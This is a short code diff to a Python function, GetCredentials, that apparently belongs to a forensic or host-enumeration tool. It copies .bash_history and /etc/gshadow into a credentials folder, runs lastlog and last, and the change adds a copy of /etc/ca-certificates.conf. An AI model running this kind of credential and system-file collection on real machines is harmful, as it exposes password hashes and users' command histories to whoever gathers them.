@@ -246,6 +246,8 @@ def GetCredentials():
     	shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
     if os.path.isfile("/etc/gshadow") is True:
         shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
+    if os.path.isfile("/etc/ca-certificates.conf") is True:
+    	shutil.copy2("/etc/ca-certificates.conf", Temp_Dir+"/credentials/")
 
     os.system("lastlog > lastlog.txt")
     os.system("last -a > last.txt")
